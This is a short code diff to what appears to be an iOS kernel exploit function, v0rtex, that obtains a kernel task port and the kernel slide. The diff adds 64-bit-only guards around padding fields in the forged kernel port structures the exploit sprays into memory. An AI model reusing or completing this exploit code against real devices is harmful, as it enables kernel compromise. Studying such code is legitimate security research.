@@ -426,7 +426,9 @@ typedef struct {
             natural_t receiver_name;
             uint16_t msgcount;
             uint16_t qlimit;
+#ifdef __LP64__
             uint32_t pad;
+#endif
         } port;
         kptr_t klist;
     } ip_messages;
@@ -649,6 +651,7 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
             .data = 0x0,
             .type = 0x11,
         },
+#ifdef __LP64__
         .ip_messages =
         {
             .port =
@@ -665,6 +668,7 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
         },
         .ip_nsrequest = 0x0,
         .ip_pdrequest = 0x11,
+#endif
     };
     for(uintptr_t ptr = (uintptr_t)&dict[5], end = (uintptr_t)&dict[5] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
     {
@@ -703,8 +707,10 @@ kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
         for(size_t j = 0; j < DATA_SIZE / sizeof(kport_t); ++j)
         {
             dptr[j].ip_context = (dptr[j].ip_context & 0xffffffff) | ((uint64_t)(0x10000000 | i) << 32);
+#ifdef __LP64__
             dptr[j].ip_messages.port.pad = 0x20000000 | i;
             dptr[j].ip_lock.pad = 0x30000000 | i;
+#endif
         }
         uint32_t dummy;
         size = sizeof(dummy);
